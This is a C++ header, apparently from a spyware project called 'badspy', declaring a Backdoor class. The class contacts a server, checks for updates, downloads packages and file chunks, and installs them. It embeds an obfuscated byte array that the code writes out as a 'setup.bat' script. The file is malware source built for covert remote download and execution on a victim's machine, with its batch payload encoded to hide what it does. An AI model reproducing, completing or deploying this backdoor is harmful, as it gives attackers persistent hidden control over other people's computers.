#pragma once
#include "../../badspy.c/net/comm.h"

#define SPY_BDR_FLAG_YES				1
#define SPY_BDR_FLAG_NO					0

#define SPY_BDR_HEADER_CHK_UPDATE		2
#define SPY_BDR_HEADER_DWN_PACK			3
#define SPY_BDR_HEADER_DT_FILENAME		4
#define SPY_BDR_HEADER_DT_FILESIZE		5
#define SPY_BDR_HEADER_DT_FILECHUNK		6
#define SPY_BDR_HEADER_PACKS_LIST		7

#define SPY_BDR_SETUP_PACK_SCRIPT		{76, 126, 111, 129, 123, 57, 123, 127, 114, 38, 22, 140, 113, 141, 120, 136, 111, 122, 120, 38, 22, 140, 113, 141, 44, 143, 110, 140, 73, 59, 49, 141, 113, 134, 124, 62, 49, 107, 77, 103, 80, 104, 89, 62, 107, 71, 130, 123, 127, 59, 25, 35, 117, 127, 44, 126, 132, 130, 127, 141, 44, 62, 130, 123, 127, 62, 44, 125, 113, 133, 44, 72, 114, 57, 59, 138, 44, 62, 130, 123, 127, 62, 25, 35, 74, 62, 130, 123, 127, 62, 44, 57, 113, 124, 116, 136, 44, 108, 113, 141, 44, 127, 127, 136, 44, 86, 44, 92, 126, 126, 109, 141, 113, 104, 110, 131, 113, 124, 128, 65, 46, 108, 111, 139, 117, 137, 128, 130, 122, 128, 58, 95, 117, 133, 113, 108, 133, 140, 128, 126, 121, 104, 110, 131, 113, 124, 128, 59, 53, 38, 22, 87, 74, 62, 130, 123, 127, 62, 44, 126, 111, 129, 123, 57, 114, 136, 120, 125, 113, 139, 44, 86, 44, 62, 61, 57, 55, 57, 46, 120, 46, 38, 22, 87, 74, 62, 130, 123, 127, 62, 44, 126, 111, 129, 123, 57, 134, 130, 124, 127, 117, 133, 113, 57, 73, 57, 49, 74, 25, 35, 74, 87, 49, 143, 110, 140, 49, 57, 113, 124, 116, 136, 44, 98, 114, 57, 90, 104, 96, 57, 114, 140, 123, 71, 82, 136, 120, 125, 113, 139, 81, 145, 117, 140, 128, 140, 52, 127, 123, 133, 112, 126, 126, 66, 44, 109, 116, 126, 122, 38, 22, 87, 74, 62, 130, 123, 127, 62, 44, 126, 111, 129, 123, 57, 114, 140, 123, 71, 79, 139, 113, 122, 128, 126, 82, 136, 120, 125, 113, 139, 52, 127, 123, 133, 112, 126, 126, 66, 25, 35, 74, 87, 49, 143, 110, 140, 49, 57, 113, 124, 116, 136, 44, 94, 122, 125, 44, 98, 114, 38, 22, 87, 74, 62, 130, 123, 127, 62, 44, 126, 111, 129, 123, 57, 127, 126, 128, 57, 123, 123, 118, 108, 116, 126, 120, 133, 44, 86, 44, 92, 126, 126, 109, 141, 113, 104, 110, 131, 113, 124, 128, 65, 46, 108, 116, 126, 120, 133, 58, 90, 124, 137, 120, 130, 111, 122, 128, 130, 123, 135, 46, 66, 25, 35, 74, 87, 49, 143, 110, 140, 49, 57, 113, 124, 116, 136, 44, 140, 113, 141, 44, 95, 117, 133, 113, 140, 85, 135, 102, 130, 124, 86, 123, 123, 118, 108, 116, 126, 120, 133, 58, 103, 109, 134, 113, 108, 124, 122, 111, 126, 52, 147, 117, 137, 114, 130, 120, 126, 53, 71, 117, 141, 113, 134, 127, 38, 22, 87, 74, 62, 130, 123, 127, 62, 44, 126, 111, 129, 123, 57, 111, 122, 120, 133, 44, 136, 110, 131, 95, 129, 113, 133, 120, 71, 90, 122, 121, 126, 95, 137, 109, 124, 113, 65, 114, 136, 120, 125, 113, 139, 53, 71, 79, 136, 124, 146, 84, 126, 126, 126, 52, 95, 117, 133, 113, 140, 85, 135, 102, 130, 124, 69, 44, 76, 60, 82, 62, 66, 25, 35, 74, 87, 49, 143, 110, 140, 49, 57, 113, 124, 116, 136, 44, 108, 113, 141, 44, 127, 127, 136, 44, 86, 44, 103, 123, 141, 116, 130, 122, 128, 25, 35, 74, 87, 49, 143, 110, 140, 49, 57, 113, 124, 116, 136, 44, 108, 113, 141, 44, 136, 110, 131, 95, 129, 113, 133, 120, 57, 73, 57, 90, 136, 128, 129, 117, 135, 115, 38, 22, 124, 127, 124, 126, 130, 124, 141, 44, 72, 59, 135, 123, 133, 123, 128, 123, 57, 59, 72, 110, 57, 49, 143, 110, 140, 49, 38, 22, 130, 114, 57, 113, 145, 117, 140, 128, 57, 49, 143, 110, 140, 49, 57, 112, 126, 120, 57, 59, 127, 44, 72, 125, 57, 49, 143, 110, 140, 49, 38, 22, 130, 114, 57, 113, 145, 117, 140, 128, 57, 49, 74, 44, 125, 113, 133, 44, 72, 114, 57, 59, 138, 44, 62, 61, 38, 22, 140, 128, 122, 126, 141, 44, 59, 46, 57, 59, 123, 44, 62, 61, 120, 104, 130, 122, 140, 128, 122, 120, 133, 58, 123, 109, 141, 25, 35, 113, 135, 112, 133, 123, 124, 109, 133, 25, 35, 52, 128, 123, 141, 123, 66, 44, 75, 74, 135, 129, 133, 44, 63, 44, 125, 113, 133, 44, 59, 49, 151, 114, 73, 46}
#define SPY_BDR_SETUP_PACK_SCRIPT_NAME	"setup.bat"

struct Version
{
	byte major;
	byte minor;
	byte revision;
};

class Backdoor : public Comm
{
	char * upd_pck_path = NULL;
	const char * root_dir = NULL;
	const char * working_dir = NULL;
	char * script_file_path = NULL;
	bool check_update_avaiable(const Version * version) const;
	bool dwnl_pack(byte id, char * file_path);
	bool dwnl_file(char * file_path) const;
	void install_pack(const char * file_path) const;
	bool export_setup_script() const;
	void create_working_dir_if_necessary() const;
public:
	void install_packs_if_necessary();
	bool check_and_dwnl_update();
	void install_update_pack();
	Backdoor(const char * server_addr, int server_port, const char * working_dir, const char * root_dir);
	~Backdoor();
};
